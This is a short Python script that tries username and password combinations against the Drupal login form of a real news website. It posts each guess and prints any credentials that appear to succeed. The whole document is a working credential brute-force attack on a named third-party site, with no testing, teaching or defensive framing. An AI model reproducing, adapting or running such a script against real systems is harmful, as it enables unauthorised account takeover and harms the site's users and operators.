import requests
import sys
import time
from space import *

def attempt(number, username, title, passwords):
	try:
		for item in [username, title] + passwords:
			data = {"form_id": "user_login", "name": username, "pass": item}
			response = requests.post("http://zerohedge.com/user/", data).text
			if "/user/password" not in response:
				sys.stdout.write(str(number) + \
					space("number", len(str(number))) + username + \
					space("username", len(username)) + item + "\n")
				sys.stdout.flush()
				exit()
	except Exception as error: time.sleep(1)
